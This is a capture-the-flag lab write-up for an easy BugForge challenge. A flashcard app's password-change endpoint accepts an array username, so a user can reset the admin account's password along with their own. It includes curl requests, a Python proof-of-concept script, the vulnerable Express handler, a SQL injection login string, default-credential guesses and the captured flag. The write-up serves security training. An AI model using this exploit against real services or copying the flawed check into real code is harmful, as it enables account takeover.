# tanuki-009 - BugForge Lab Writeup

**URL:** https://lab-1785574864136-6qz9cj.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Type confusion on an ownership check leading to mass password reset (Broken Access Control)
**Flag:** `bug{umBoalYShLbqjxj4NA4jNHiZZRd96mF3}`

---

## Summary

Tanuki is a flashcard/SRS study app (React SPA + Node/Express API, JWT bearer auth). The
password-change endpoint checks that a caller can only update "their own" password by testing
whether the request's `username` field equals or contains the JWT-derived username. The field
is never validated to be a string, so an array bypasses the intent of the check: `.includes()`
on an array only needs to contain the caller's own username somewhere in it, while the actual
database update is applied to every username present in that same array. Sending your own
username alongside `admin` in the array resets both accounts in a single authorized request.

---

## Tech Stack

- React SPA (Create React App build)
- Node/Express REST API under `/api/*`
- JWT (HS256) bearer auth, payload limited to `{id, username, iat}` - no role claim, role is
  looked up server-side per request
- SQLite backend

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/login` | POST | No | Returns `{token, user:{...}}` |
| `/api/verify-token` | GET | Bearer | Confirms role server-side |
| `/api/profile/change-password` | POST | Bearer | Vulnerable - no current-password check, `username` field accepts an array |
| `/api/decks`, `/api/decks/:id` | GET | Bearer | Deck listing/detail |
| `/api/admin/*` | GET | Bearer, admin role | Correctly blocked for non-admin users |

---

## Discovery

### Step 1 - Register and map the route surface

Registration returns a usable JWT directly:

```
POST /api/register {"username":"pentestXXXX","email":"...","password":"Password123!"}
-> {"token": "...", "id": ...}
```

The bundled JS confirmed the full `/api/*` route surface, including
`POST /api/profile/change-password`.

### Step 2 - Rule out the classic bug classes for this app family

This app family reuses the same theme across many distinct backend instances, so each known
bug class was checked directly against this instance rather than assumed present:

- Default credentials (`admin:admin123`, `admin:admin`, `admin:password`) - all rejected.
- SQLi auth bypass (`' OR 1=1--` in the login password field) - rejected, login body is
  validated before it reaches a query.
- Mass assignment (`role:"admin"` on `POST /api/register`) - accepted the request but
  `GET /api/verify-token` showed `role:"user"` afterward. Patched in this instance.
- JWT `alg:none` - explicitly rejected server-side.
- `POST /api/decks/import` (XML/XXE, a known bug class in earlier instances of this app) -
  404, the route does not exist in this build at all.

### Step 3 - Systematically test write endpoints for missing ownership checks

With the well-known bug classes ruled out, the remaining write surface was tested for proper
ownership enforcement. `POST /api/profile/change-password` stood out immediately: it accepted a
password change with no current-password verification, gated only by a check that the supplied
`username` matched the caller's own:

```bash
curl -X POST $TARGET/api/profile/change-password \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username":"pentestXXXX","newPassword":"NewPassword123!"}'
# {"message":"Password updated","accounts_updated":1}
```

The response field `accounts_updated` (plural, with a numeric count rather than a boolean) is an
unusual shape for a single-row update and was the concrete signal that the backend's update path
operates over a collection rather than a single row keyed by primary key. That pattern - a
counted "rows affected" field on what should be a single-user operation - is a strong hint that
the field feeding the query is not being constrained to a scalar. Testing the same field as a
JSON array was the natural next step:

```bash
curl -X POST $TARGET/api/profile/change-password \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username":["pentestXXXX","admin"],"newPassword":"Hacked123!"}'
# {"message":"Password updated","accounts_updated":2}
```

`accounts_updated` jumped from 1 to 2 - the request updated both the caller's own account and
`admin`'s. Sending `["admin"]` alone, without the caller's own username included, is correctly
rejected (`{"error":"You can only change your own password"}`), confirming the check is a naive
"does the array contain my username" test rather than "is the target set exactly my username".

### Step 4 - Log in as admin

```bash
curl -X POST $TARGET/api/login -d '{"username":"admin","password":"Hacked123!"}'
# {"token":"...","user":{"id":1,"username":"admin","email":"bug{umBoalYShLbqjxj4NA4jNHiZZRd96mF3}","full_name":"Tanuki Admin","role":"admin"}}
```

The flag was sitting in the admin user's `email` field, returned directly in the login response.

---

## Proof of Concept

```python
import json, urllib.request, urllib.error, time

BASE = "https://lab-1785574864136-6qz9cj.labs-app.bugforge.io"
H = {"Content-Type": "application/json"}

def req(method, path, data=None, token=None):
    url = BASE + path
    h = dict(H)
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
username = f"pentest{ts}"
_, body = req("POST", "/api/register", {
    "username": username, "email": f"{username}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

new_password = "Hacked123!"
req("POST", "/api/profile/change-password",
    {"username": [username, "admin"], "newPassword": new_password}, token=token)

_, login_body = req("POST", "/api/login", {"username": "admin", "password": new_password})
print(login_body)
# -> user.email contains bug{umBoalYShLbqjxj4NA4jNHiZZRd96mF3}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `admin:admin123` / `admin:admin` / `admin:password` default creds | No token | Not the intended path |
| SQLi auth bypass (`' OR 1=1--`) on login | Rejected | Login body is validated before reaching a query |
| Mass assignment `role:"admin"` on `POST /api/register` | Ignored, `verify-token` still shows `role:"user"` | Patched in this instance |
| JWT `alg:none` | Rejected | Server explicitly checks `alg` |
| `POST /api/decks/import` (XXE, present in earlier instances of this app) | 404 | Route does not exist in this build |
| Guessed IDOR paths from prior instances of this app (`/api/stats/:id`, `/api/users/:id`) | SPA fallback | Always confirm routes against this instance's own bundle rather than assuming a prior instance's paths carry over |

---

## Root Cause

The `username` field in the change-password handler is never validated to be a string before
being used both in an authorization check and in the update query itself:

```javascript
// Vulnerable pattern (approximate)
app.post('/api/profile/change-password', auth, (req, res) => {
  const { username, newPassword } = req.body;
  // String.prototype.includes() and Array.prototype.includes() share a method name -
  // this passes as long as the caller's own username is somewhere in the array
  if (!username.includes(req.user.username)) {
    return res.status(403).json({ error: "You can only change your own password" });
  }
  // a query builder or ORM sees an array here and expands it to WHERE username IN (...)
  const result = db.run(
    `UPDATE users SET password = ? WHERE username = ?`, [hash(newPassword), username]
  );
  res.json({ message: "Password updated", accounts_updated: result.changes });
});
```

The authorization check tests the wrong direction - "is the caller's username present in the
target set" - when it should assert the target set is exactly `{ callerUsername }`. Combined
with no current-password verification, an attacker-controlled array smuggles additional
usernames past the check while the database layer applies the update to all of them.

---

## CWE / OWASP

- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes
  (type confusion allowing an array where a scalar was expected)
- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **OWASP API Top 10**: API1:2023 Broken Object Level Authorization / API3:2023 Broken Object
  Property Level Authorization
